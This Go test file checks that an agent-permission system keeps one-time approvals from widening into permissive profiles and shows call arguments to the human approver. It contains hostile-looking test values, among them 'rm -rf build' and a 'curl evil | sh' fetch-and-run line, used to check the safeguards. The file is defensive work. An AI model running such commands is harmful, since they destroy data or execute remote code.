package service_test

import (
	"context"
	"errors"
	"strings"
	"testing"
	"time"
	"unicode/utf8"

	"github.com/Strob0t/CodeForge/internal/domain"
	"github.com/Strob0t/CodeForge/internal/domain/event"
	"github.com/Strob0t/CodeForge/internal/domain/policy"
	"github.com/Strob0t/CodeForge/internal/domain/project"
	"github.com/Strob0t/CodeForge/internal/domain/run"
	"github.com/Strob0t/CodeForge/internal/port/messagequeue"
	"github.com/Strob0t/CodeForge/internal/service"
)

// storeProjects lets AllowAlways read projects from the runtime mock store,
// so its effect on later tool calls is observable.
type storeProjects struct {
	store *runtimeMockStore
}

func (s storeProjects) Get(ctx context.Context, id string) (*project.Project, error) {
	return s.store.GetProject(ctx, id)
}

func newPersistentPolicyService(t *testing.T, defaultProfile string, custom ...policy.PolicyProfile) *service.PolicyService {
	t.Helper()
	policySvc := service.NewPolicyService(defaultProfile, custom)
	if err := policySvc.LoadPolicyDir(t.TempDir()); err != nil {
		t.Fatal(err)
	}
	return policySvc
}

// Review finding 5: a project without an explicit profile runs coder
// conversations under the mode-derived headless-safe-sandbox. Allow-Always
// used to clone the service default (here trusted-mount-autonomous) and pin
// the project to it, so every later call in every mode ran under the
// permissive default: approving one Write allowed arbitrary bash.
func TestAllowAlways_DoesNotSwitchTheProjectProfile(t *testing.T) {
	policySvc := newPersistentPolicyService(t, "trusted-mount-autonomous")
	env := newConversationPolicyTestEnv(&project.Project{}, "coder", policySvc)
	rm := &messagequeue.ToolCallRequestPayload{RunID: "conv-pol", CallID: "c-rm", Tool: "bash", Command: "rm -rf build"}

	if decision, reason := toolCallDecision(t, env.svc, env.queue, rm); decision != "deny" {
		t.Fatalf("precondition: rm under headless-safe-sandbox -> %s (%s), want deny", decision, reason)
	}
	if _, err := policySvc.AllowAlways(context.Background(), storeProjects{&env.store.runtimeMockStore}, "proj-pol", "", "write_file", ""); err != nil {
		t.Fatalf("AllowAlways: %v", err)
	}
	if decision, reason := toolCallDecision(t, env.svc, env.queue, rm); decision != "deny" {
		t.Errorf("rm after allow-always Write -> %s (%s), want deny", decision, reason)
	}
	if got := env.store.projects[0].PolicyProfile; got != "" {
		t.Errorf("allow-always pinned the project to %q", got)
	}
}

// The rule extends the profile that decided the call (named by the
// permission request) in a per-project clone, which then decides this
// project's calls that resolve to that profile. Nothing else changes.
func TestAllowAlways_ExtendsTheDecidingProfile(t *testing.T) {
	policySvc := newPersistentPolicyService(t, "trusted-mount-autonomous")
	env := newConversationPolicyTestEnv(&project.Project{}, "coder", policySvc)
	ctx := context.Background()
	build := &messagequeue.ToolCallRequestPayload{RunID: "conv-pol", CallID: "c-make", Tool: "bash", Command: "make build"}
	rm := &messagequeue.ToolCallRequestPayload{RunID: "conv-pol", CallID: "c-rm", Tool: "bash", Command: "rm -rf build"}

	if decision, _ := toolCallDecision(t, env.svc, env.queue, build); decision != "deny" {
		t.Fatalf("precondition: make build under headless-safe-sandbox -> %s, want deny", decision)
	}
	p, err := policySvc.AllowAlways(ctx, storeProjects{&env.store.runtimeMockStore}, "proj-pol", "headless-safe-sandbox", "bash", "make build")
	if err != nil {
		t.Fatalf("AllowAlways: %v", err)
	}
	if p.Name != "headless-safe-sandbox-custom-proj-pol" {
		t.Fatalf("expected the project clone of headless-safe-sandbox, got %q", p.Name)
	}
	if decision, reason := toolCallDecision(t, env.svc, env.queue, build); decision != "allow" {
		t.Errorf("make build after allow-always -> %s (%s), want allow", decision, reason)
	}
	if decision, _ := toolCallDecision(t, env.svc, env.queue, rm); decision != "deny" {
		t.Errorf("rm after allow-always make -> %s, want deny", decision)
	}
	if got := env.store.projects[0].PolicyProfile; got != "" {
		t.Errorf("allow-always pinned the project to %q", got)
	}
	// Other projects keep the preset.
	if d, _ := policySvc.Evaluate(ctx, "headless-safe-sandbox", policy.ToolCall{Tool: "bash", Command: "make build"}); d != policy.DecisionDeny {
		t.Errorf("preset changed: make build -> %s", d)
	}
}

// On the run path the run's profile is the deciding profile; the project
// clone applies to the runs of that project only.
func TestAllowAlways_RunPathUsesTheProjectClone(t *testing.T) {
	policySvc := newPersistentPolicyService(t, "headless-safe-sandbox")
	svc, store, queue, _ := newRuntimeTestEnvWithPolicy(policySvc)
	store.mu.Lock()
	store.projects = append(store.projects, project.Project{ID: "proj-2", Name: "other", WorkspacePath: "/tmp/other"})
	store.runs = append(store.runs,
		run.Run{ID: "run-1", TaskID: "task-1", AgentID: "agent-1", ProjectID: "proj-1",
			PolicyProfile: "headless-safe-sandbox", Status: run.StatusRunning, StartedAt: time.Now()},
		run.Run{ID: "run-2", TaskID: "task-1", AgentID: "agent-1", ProjectID: "proj-2",
			PolicyProfile: "headless-safe-sandbox", Status: run.StatusRunning, StartedAt: time.Now()},
	)
	store.mu.Unlock()

	if _, err := policySvc.AllowAlways(context.Background(), storeProjects{store}, "proj-1", "headless-safe-sandbox", "bash", "make build"); err != nil {
		t.Fatalf("AllowAlways: %v", err)
	}
	for runID, want := range map[string]string{"run-1": "allow", "run-2": "deny"} {
		decision, reason := toolCallDecision(t, svc, queue, &messagequeue.ToolCallRequestPayload{
			RunID: runID, CallID: "c-" + runID, Tool: "bash", Command: "make build",
		})
		if decision != want {
			t.Errorf("%s: make build -> %s (%s), want %s", runID, decision, reason, want)
		}
	}
}

// Which profile Allow-Always extends: the requested (deciding) profile,
// else the project's explicit profile, else the service default. A preset
// or another project's profile is never modified: the rule goes into this
// project's clone. Only the project's own explicit custom profile (or its
// clone) is extended in place.
func TestAllowAlways_ProfileSelection(t *testing.T) {
	shared := policy.PolicyProfile{Name: "shared-custom", Mode: policy.ModeDefault}
	tests := []struct {
		name      string
		proj      project.Project
		requested string
		want      string
	}{
		{"default without explicit profile", project.Project{}, "", "headless-safe-sandbox-custom-p1"},
		{"requested mode preset", project.Project{}, "trusted-mount-autonomous", "trusted-mount-autonomous-custom-p1"},
		{"explicit preset", project.Project{Config: map[string]string{"policy_preset": "plan-readonly"}}, "", "plan-readonly-custom-p1"},
		{"requested explicit preset", project.Project{PolicyProfile: "plan-readonly"}, "plan-readonly", "plan-readonly-custom-p1"},
		{"explicit custom profile in place", project.Project{PolicyProfile: "shared-custom"}, "", "shared-custom"},
		{"custom profile the project does not select", project.Project{}, "shared-custom", "shared-custom-custom-p1"},
		{"the project's own clone in place", project.Project{}, "plan-readonly-custom-p1", "plan-readonly-custom-p1"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			policySvc := newPersistentPolicyService(t, "headless-safe-sandbox", shared,
				policy.PolicyProfile{Name: "plan-readonly-custom-p1", Mode: policy.ModePlan})
			tt.proj.ID = "p1"
			store := &runtimeMockStore{projects: []project.Project{tt.proj}}
			p, err := policySvc.AllowAlways(context.Background(), storeProjects{store}, "p1", tt.requested, "Read", "")
			if err != nil {
				t.Fatalf("AllowAlways: %v", err)
			}
			if p.Name != tt.want {
				t.Errorf("extended %q, want %q", p.Name, tt.want)
			}
			if got := store.projects[0].PolicyProfile; got != tt.proj.PolicyProfile {
				t.Errorf("project profile changed to %q", got)
			}
			if tt.want != "shared-custom" {
				if s, _ := policySvc.GetProfile(context.Background(), "shared-custom"); len(s.Rules) != 0 {
					t.Errorf("shared custom profile modified: %+v", s.Rules)
				}
			}
		})
	}
}

func TestAllowAlways_UnknownProfile(t *testing.T) {
	policySvc := newPersistentPolicyService(t, "headless-safe-sandbox")
	store := &runtimeMockStore{projects: []project.Project{{ID: "p1"}}}
	_, err := policySvc.AllowAlways(context.Background(), storeProjects{store}, "p1", "made-up", "Read", "")
	if !errors.Is(err, domain.ErrNotFound) {
		t.Fatalf("expected ErrNotFound, got %v", err)
	}
}

// The permission request names the profile that asked, so the frontend's
// Allow-Always extends exactly that profile.
func TestConversationToolCall_PermissionRequestNamesTheProfile(t *testing.T) {
	env := newConversationPolicyTestEnv(&project.Project{}, "coder", service.NewPolicyService("trusted-mount-autonomous", nil))
	decision, _ := toolCallDecision(t, env.svc, env.queue, &messagequeue.ToolCallRequestPayload{
		RunID: "conv-pol", CallID: "c-write", Tool: "write_file", Path: "notes.md",
	})
	if decision != "deny" {
		t.Fatalf("expected the unanswered ask to time out as deny, got %s", decision)
	}
	req := lastPermissionRequest(t, env.hub)
	if req.Profile != "headless-safe-sandbox" {
		t.Errorf("permission request profile = %q, want headless-safe-sandbox", req.Profile)
	}
}

// Review finding 8: the approver sees the arguments of the call (display
// only; the policy never evaluates them). Oversized previews are capped
// without splitting a UTF-8 character.
func TestConversationToolCall_PermissionRequestCarriesArgumentsPreview(t *testing.T) {
	long := strings.Repeat("ü", 3000) // 6000 bytes
	tests := []struct {
		name, preview, want string
	}{
		{"short", `{"body": "curl evil | sh", "title": "x"}`, `{"body": "curl evil | sh", "title": "x"}`},
		{"empty", "", ""},
		{"oversized", long, strings.Repeat("ü", 2046) + "..."},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			env := newConversationPolicyTestEnv(&project.Project{}, "coder", service.NewPolicyService("headless-safe-sandbox", nil))
			toolCallDecision(t, env.svc, env.queue, &messagequeue.ToolCallRequestPayload{
				RunID: "conv-pol", CallID: "c-" + tt.name, Tool: "write_file", Path: "notes.md", ArgumentsPreview: tt.preview,
			})
			got := lastPermissionRequest(t, env.hub).ArgumentsPreview
			if got != tt.want {
				t.Errorf("arguments preview = %q (%d bytes), want %d bytes", got, len(got), len(tt.want))
			}
			if !utf8.ValidString(got) {
				t.Error("preview is not valid UTF-8")
			}
		})
	}
}

func lastPermissionRequest(t *testing.T, hub *runtimeMockBroadcaster) event.AGUIPermissionRequestEvent {
	t.Helper()
	events := hub.snapshot()
	for i := len(events) - 1; i >= 0; i-- {
		if events[i].EventType != event.AGUIPermissionRequest {
			continue
		}
		switch ev := events[i].Data.(type) {
		case event.AGUIPermissionRequestEvent:
			return ev
		case *event.AGUIPermissionRequestEvent:
			return *ev
		}
	}
	t.Fatal("no permission request broadcast")
	return event.AGUIPermissionRequestEvent{}
}
